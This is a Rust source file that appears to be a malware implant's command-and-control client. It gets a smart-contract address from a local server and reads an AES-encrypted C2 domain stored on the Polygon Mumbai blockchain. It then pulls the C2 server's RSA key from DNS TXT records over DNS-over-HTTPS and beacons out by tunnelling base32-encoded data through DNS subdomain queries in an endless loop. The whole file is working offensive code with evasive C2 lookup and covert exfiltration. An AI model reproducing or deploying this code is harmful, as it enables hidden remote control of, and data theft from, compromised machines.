use std::net::{TcpStream,Shutdown};
use std::io::prelude::*;
use std::io::Result;
use ethers::prelude::*;
use ethers::providers::{Http, Middleware, Provider};
use std::str::FromStr;
use web3::contract::{Contract, Options};
use http::{Request, Response};
use url::{Url, ParseError};
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use hex_literal::hex;
use generic_array::typenum::*;
use std::process;
use aes::Aes128;
use block_modes::{BlockMode, Cfb};
use block_modes::block_padding::Pkcs7;
use std::str;
use std::error::Error;
use std::env;
use base32::{Alphabet, decode, encode};
use rsa::{RsaPublicKey, PublicKey, RsaPrivateKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, Oaep, pkcs8::EncodePublicKey, pkcs8::LineEnding};
use sha2::{Sha256, Sha512, Digest};
type Aes128ECfb = Cfb<Aes128, Pkcs7>;

static Hash: &str = "UNIQUEHASH";
static ContractKey: &str = "SMARTCONTRACTKEY";
static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";
use web3::{
    ethabi::ethereum_types::U256,
    types::{Address, TransactionParameters, H160},
};

use reqwest::blocking::Client;
use fancy_regex::Regex; 

fn parseCertificate(response: &str) -> String{
    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
    let mut result = String::new();

    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }
    return result.clone()

}

fn sendDnsRequest(domain: &str) -> Result<()>{
    println!("Sent request to: {}", &domain);
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "A");

    let client = Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    println!("{}",data);
    Ok(())
}

fn dnsRequestEncoder(domain: &str, message: &String){
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let base64Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &message.as_bytes()
    );
    let messageSize = base64Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;
    println!("Data: {} {} {}", &domain, &base64Data, &message);


    let mut result = String::new();
    println!("Max DNS request size: {} | DNS domain name size: {} | Max DNS data {}", dnsMAX, dnsdomainNameSize, maxDNSData);
    

    for (i, c) in base64Data.chars().enumerate() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
            println!("{}", result);
            sendDnsRequest(&result);
            result.clear();
        }
        result.push(c);
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        println!("{}", result);
        sendDnsRequest(&result);
        result.clear();
        lastPacket = 0;
    }


}
use std::sync::Mutex;
use lazy_static::lazy_static;



fn generateKeyPair() -> String{
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let private_key_local = RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = RsaPublicKey::from(&private_key_local);
    let pubkey_der = public_key.to_public_key_der().unwrap();
    let pubkey_der_string = pubkey_der.to_pem("PUBLIC KEY", LineEnding::default()).unwrap();
    return pubkey_der_string;

}

// generate RSA keypair and send public key to C2 over DoH
fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> String{
    let pubkey = generateKeyPair();
    let pubkeyBase32 = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &pubkey.as_bytes()
    );

    let mut hasher = Sha256::new();
    hasher.update(serverPublicKey);
    let result = hasher.finalize();

    let serverPublicKeySha256: String = format!("{:x}", result);
    let s = format!("1|{}|{}", serverPublicKeySha256, pubkeyBase32);
    dnsRequestEncoder(domain, &s);
    return serverPublicKeySha256;
}
use std::{thread, time};

fn pingServerHandler(domain: &str, public_key_hash: &str, sleepTime: &u64){
    let ten_millis = time::Duration::from_millis(*sleepTime);
    let s: String = format!("2|{}", public_key_hash);
    while true{
        dnsRequestEncoder(domain, &s);
        thread::sleep(ten_millis);
    }
}

//fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey){
 //   
//}

use std::time::Duration;

fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str){
    let mut sleepTime: u64 = 10000;
    let domain_clone = domain.to_string();
    let public_key_hash_clone = public_key_hash.to_string();
    println!("ping server");
    thread::spawn(move || {
        pingServerHandler(&domain_clone, &public_key_hash_clone, &sleepTime);
    });
    loop {
        thread::sleep(Duration::from_secs(1));
    }
}


fn handleCertificate(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "TXT");

    let client = Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    let mut result = String::new();
    result = parseCertificate(&data);
    let decoded_bytes = decode(
        Alphabet::RFC4648 { padding: true },
        &result
    ).unwrap();
    let public_key_external = Some(RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap());
    
    //let padding = Oaep::new::<sha2::Sha256>();
    //let mut rng = rand::thread_rng();
    // let data = b"hello world";
    // let enc_data = public_key.encrypt(&mut rng, padding, &data[..]).expect("failed to encrypt");
    // println!("Decoded: {:?}", public_key);

    let serverPublicKeySha256 = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());
    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256);

    let s = format!("2|{}", serverPublicKeySha256);
    dnsRequestEncoder(domain, &s);

    Ok(())
}

#[tokio::main]
async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
    let transport = web3::transports::Http::new(TestnetRPC)?;
    let web3 = web3::Web3::new(transport);
    let smart_contract_addr = Address::from_str(addr).unwrap();

    let contractC2 = Contract::from_json(web3.eth(), smart_contract_addr, include_bytes!("/home/user/Desktop/babagola/ContractBuild/SmartContractDeployment_contracts_HuInAgSRjrwBoUnRZBbw_sol_HuInAgSRjrwBoUnRZBbw.abi"))
    .expect("deu ruim");
    let C2AESContent: String = contractC2
        .query("CONTRACTVARIABLENAME", (), None, Options::default(), None)
        .await
        .unwrap();

    let C2AESContent_b64dec = base64::decode(C2AESContent).unwrap();
    let key_dec = base64::decode(ContractKey).unwrap();

    let key = &key_dec[..];

    let iv = &C2AESContent_b64dec[..16];
    let message  = &C2AESContent_b64dec[16..];
    
    let mut buf = message.to_vec();

    let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
    let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();

    let domain = String::from_utf8_lossy(decrypted_ciphertext);
    Ok((Ok(()), domain.to_string()))
}

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:1337")?;
    let mut smartContractAddressBuffer= [0; 42];

    stream.write(&Hash.as_bytes())?;
    stream.read(&mut smartContractAddressBuffer)?;
    stream.shutdown(Shutdown::Both);

    let smartContractAddress = std::str::from_utf8(&smartContractAddressBuffer).unwrap().trim_matches(char::from(0));
    let rpcResponse = rpcInteract(smartContractAddress);


    match rpcResponse{
        Ok((_, domain)) =>{
            handleCertificate(&domain);
        }
        Err(e) =>{
            process::exit(0);
        }
    }

    Ok(())
}
